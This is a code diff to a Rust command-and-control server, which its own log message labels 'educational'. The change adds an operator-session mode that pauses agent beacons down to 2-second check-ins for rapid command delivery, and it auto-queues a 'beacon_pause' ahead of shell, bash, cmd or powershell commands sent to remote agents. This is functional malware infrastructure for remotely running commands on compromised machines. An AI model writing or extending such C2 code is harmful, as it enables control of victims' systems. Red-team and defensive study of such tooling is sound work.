@@ -9,7 +9,7 @@ use tower_http::{
     cors::CorsLayer,
     services::ServeDir,
 };
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::net::SocketAddr;
 use std::sync::Arc;
 use tokio::sync::broadcast;
@@ -162,6 +162,7 @@ async fn main() {
         tx: tx.clone(),
         command_queue: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
         session_keys: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
+        beacon_paused: Arc::new(tokio::sync::RwLock::new(HashSet::new())),
     };
 
     log_info(&db, &tx, "Server", None, "Starting Educational Multi-Agent C2 Server (HTTPS Beacon Mode)...");
@@ -218,6 +219,7 @@ async fn main() {
         .route("/api/agents/:id/logs", get(get_agent_logs))
         .route("/api/agents/:id/results", get(get_command_results))
         .route("/api/agents/:id/session/kill", post(kill_agent_session))
+        .route("/api/agents/:id/session/start", post(start_operator_session))
         .route("/api/logs", get(get_logs))
         .route("/api/beacon", post(receive_beacon))
         .route("/api/result", post(receive_result))
@@ -385,10 +387,17 @@ async fn receive_beacon(
         outbound
     };
 
-    let sleep_interval_secs = state
-        .db
-        .get_beacon_interval(&agent.id)
-        .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS);
+    let sleep_interval_secs = {
+        let paused = state.beacon_paused.read().await;
+        if paused.contains(&agent.id) {
+            2
+        } else {
+            state
+                .db
+                .get_beacon_interval(&agent.id)
+                .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS)
+        }
+    };
 
     if !commands.is_empty() {
         log_info(
@@ -549,8 +558,35 @@ async fn queue_command(
         payload: data.payload.clone(),
     };
 
+    let is_shell_cmd = matches!(
+        data.command_type.as_str(),
+        "shell" | "bash" | "cmd" | "powershell"
+    );
+
     {
         let mut queue = state.command_queue.write().await;
+        if is_shell_cmd {
+            let paused = state.beacon_paused.read().await;
+            if !paused.contains(&data.agent_id) {
+                drop(paused);
+                state
+                    .beacon_paused
+                    .write()
+                    .await
+                    .insert(data.agent_id.clone());
+                queue
+                    .entry(data.agent_id.clone())
+                    .or_default()
+                    .insert(
+                        0,
+                        PendingCommand {
+                            id: uuid::Uuid::new_v4().to_string(),
+                            command_type: "beacon_pause".to_string(),
+                            payload: String::new(),
+                        },
+                    );
+            }
+        }
         queue
             .entry(data.agent_id.clone())
             .or_default()
@@ -860,19 +896,61 @@ async fn get_broadcast_history(State(state): State<ServerState>) -> Json<Value> 
     }
 }
 
-async fn kill_agent_session(
+async fn start_operator_session(
     Path(id): Path<String>,
     State(state): State<ServerState>,
 ) -> Json<Value> {
+    {
+        let mut paused = state.beacon_paused.write().await;
+        if paused.contains(&id) {
+            return Json(serde_json::json!({ "success": true, "already_active": true }));
+        }
+        paused.insert(id.clone());
+    }
+
     let cmd_id = uuid::Uuid::new_v4().to_string();
     let command = PendingCommand {
         id: cmd_id.clone(),
-        command_type: "session_kill".to_string(),
+        command_type: "beacon_pause".to_string(),
         payload: String::new(),
     };
     {
         let mut queue = state.command_queue.write().await;
         queue.entry(id.clone()).or_default().push(command);
+    }
+
+    log_info(
+        &state.db,
+        &state.tx,
+        "Session",
+        Some(id.clone()),
+        "Operator session started — beacon paused for rapid command delivery",
+    );
+
+    Json(serde_json::json!({ "success": true, "command_id": cmd_id }))
+}
+
+async fn kill_agent_session(
+    Path(id): Path<String>,
+    State(state): State<ServerState>,
+) -> Json<Value> {
+    state.beacon_paused.write().await.remove(&id);
+
+    let cmd_id = uuid::Uuid::new_v4().to_string();
+    let kill_cmd = PendingCommand {
+        id: cmd_id.clone(),
+        command_type: "session_kill".to_string(),
+        payload: String::new(),
+    };
+    let resume_cmd = PendingCommand {
+        id: uuid::Uuid::new_v4().to_string(),
+        command_type: "beacon_resume".to_string(),
+        payload: String::new(),
+    };
+    {
+        let mut queue = state.command_queue.write().await;
+        queue.entry(id.clone()).or_default().push(kill_cmd);
+        queue.entry(id.clone()).or_default().push(resume_cmd);
     }
     let _ = state.session_manager.end_session(&id);
     log_info(
